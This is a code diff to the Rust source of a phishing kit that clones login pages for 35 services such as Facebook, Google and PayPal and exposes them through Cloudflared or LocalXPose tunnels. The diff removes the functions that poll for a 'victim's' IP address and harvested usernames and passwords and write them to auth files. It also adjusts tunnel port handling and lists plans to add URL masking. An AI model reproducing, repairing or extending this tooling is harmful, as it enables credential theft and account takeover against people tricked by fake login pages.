@@ -3,7 +3,7 @@ use crate::constants::*;
 use crate::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
 
 use colored::Colorize;
-use std::{env, io};
+use std::env;
 
 use std::fs;
 use std::path::{Path, PathBuf};
@@ -12,14 +12,13 @@ use std::process::{exit, Command};
 use reqwest::Url;
 use std::fs::{File, OpenOptions, remove_file};
 use std::io::{BufRead, BufReader, stdin, stdout, Write};
-use std::thread::sleep;
-use std::time::Duration;
+#[cfg(target_os = "windows")] use std::thread::sleep;
+#[cfg(target_os = "windows")] use std::time::Duration;
 use zip::read::ZipFile;
 use zip::ZipArchive;
 use rayon::prelude::*;
 use regex::Regex;
 use reqwest::header::USER_AGENT;
-use futures::try_join;
 use crate::errors::TerminalError;
 use crate::web_server::start_webserver;
 
@@ -36,7 +35,7 @@ pub fn setup_directories() {
 
     create_dir_if_not_exists(&base_dir.join(".server"));
     create_dir_if_not_exists(&base_dir.join("auth"));
-    create_dir_if_not_exists(&base_dir.join(".server/www"));
+    // create_dir_if_not_exists(&base_dir.join(".server/www"));
     remove_file_if_exists(&base_dir.join(".server/.loclx"));
     remove_file_if_exists(&base_dir.join(".server/.cld.log"));
 }
@@ -444,17 +443,14 @@ pub async fn start_localhost(site: &str, redirect_url: String) -> Result<(), Ter
     log::info!("Starting localhost on port {}", custom_port.unwrap_or(PORT));
     println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port.unwrap_or(PORT)).cyan());
 
-    let setup_future = setup_site(site, custom_port, redirect_url);
-    let capture_future = capture_data();
-
-    try_join!(setup_future, capture_future)?;
+    setup_site(site, custom_port, redirect_url).await?;
     Ok(())
 }
 
 pub async fn tunnel_menu(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     clear_terminal()?;
     banner_small();
-    println!("Selected: {}\n", site.cyan());
+    println!("Selected: {}\n", site.to_uppercase().cyan());
     let servers = [
         ("01", "Localhost", None),
         ("02", "Cloudflared", Some("Auto Detects")),
@@ -542,124 +538,6 @@ pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> 
     Ok(())
 }
 
-fn capture_ip() -> Result<(), TerminalError> {
-    let ip_file_path = match get_server_dir() {
-        Some(s) => s,
-        None => {
-            log::error!("Failed to get server directory");
-            error_msg("Failed to get server directory");
-            exit(1);
-        }
-    }.join("www").join("ip.txt");
-    let mut ip_file = BufReader::new(File::open(ip_file_path)?);
-    let mut ip = String::new();
-    match ip_file.read_line(&mut ip) {
-        Ok(_) => {}
-        Err(e) => {
-            log::error!("Failed to read IP file: {}", e);
-            error_msg(&format!("Failed to read IP file: {}", e));
-            exit(1);
-        }
-    };
-
-    // Extract the IP part
-    if let Some(start) = ip.find("IP: ") {
-        ip = ip[start + 4..].trim().to_string();
-    } else {
-        return Err("IP not found".into());
-    }
-
-    println!("Victim's IP : {}", ip.green());
-    println!("Saved in : auth/ip.txt");
-
-    let mut auth_file = OpenOptions::new().append(true).open("auth/ip.txt")?;
-    writeln!(auth_file, "{}", ip)?;
-
-    Ok(())
-}
-
-fn capture_creds() -> Result<(), TerminalError> {
-    let usernames_file_path = match get_server_dir() {
-        Some(s) => s,
-        None => {
-            log::error!("Failed to get server directory");
-            error_msg("Failed to get server directory");
-            exit(1);
-        }
-    }.join("www").join("usernames.txt");
-
-    let file = BufReader::new(File::open(&usernames_file_path)?);
-
-    let mut account = String::new();
-    let mut password = String::new();
-
-    let account_regex = Regex::new(r"Username:\s*(\S*)").unwrap();
-    let password_regex = Regex::new(r"Pass:\s*(\S*)").unwrap();
-
-    for line in file.lines() {
-        let line = line?;
-        if account.is_empty() {
-            if let Some(captures) = account_regex.captures(&line) {
-                account = captures[1].to_string();
-            }
-        }
-        if password.is_empty() {
-            if let Some(captures) = password_regex.captures(&line) {
-                password = captures[1].to_string();
-            }
-        }
-        if !account.is_empty() && !password.is_empty() {
-            break;
-        }
-    }
-
-    println!("Account : {}", account.green());
-    println!("Password : {}", password.green());
-    println!("Saved in : auth/usernames.dat");
-
-    let mut auth_file = OpenOptions::new().append(true).open("auth/usernames.dat")?;
-    let mut original_file = File::open(&usernames_file_path)?;
-    io::copy(&mut original_file, &mut auth_file)?;
-
-    println!("Waiting for Next Login Info, Ctrl + C to exit.");
-
-    Ok(())
-}
-
-pub async fn capture_data() -> Result<(), TerminalError> {
-    println!("{} {}", "Waiting for Login Info, Ctrl + C to exit...".yellow(), "Please wait".cyan());
-    let ip_txt = match get_server_dir() {
-        Some(s) => s,
-        None => {
-            log::error!("Failed to get server directory");
-            error_msg("Failed to get server directory");
-            exit(1);
-        }
-    }.join("www").join("ip.txt");
-
-    let username_txt = match get_server_dir() {
-        Some(s) => s,
-        None => {
-            log::error!("Failed to get server directory");
-            error_msg("Failed to get server directory");
-            exit(1);
-        }
-    }.join("www").join("usernames.txt");
-    loop {
-        if ip_txt.exists() {
-            println!("{} {}", "Victim IP Found !".green(), "Please wait".cyan());
-            capture_ip()?;
-        }
-        sleep(Duration::from_millis(750));
-        if username_txt.exists() {
-            println!("{} {}", "Login info Found !!".green(), "Please wait".cyan());
-            capture_creds()?;
-        }
-        sleep(Duration::from_millis(750));
-    }
-}
-
-
 fn get_cldflr_url() -> Result<String, TerminalError> {
     let log_file_path = match get_server_dir() {
         Some(s) => s,
@@ -735,7 +613,7 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
             }
         };
         let mut cmd = Command::new(cloudflare_file);
-        cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
+        cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log");
     }
     Ok(())
 }
@@ -743,7 +621,7 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
 pub async fn main_menu() -> Result<(), TerminalError> {
     clear_terminal()?;
     banner();
-    let services = [
+    let services: [(&str, (u8, u8, u8)); 35] = [
         ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
         ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
         ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
@@ -782,7 +660,7 @@ pub async fn main_menu() -> Result<(), TerminalError> {
     Ok(())
 }
 
-
+// TODO: Add User Agent to File.
 // TODO: Add LocalXPose Auth.
 // TODO: Add Start with LocalXPose.
 // TODO: Add URL shortener/masking.
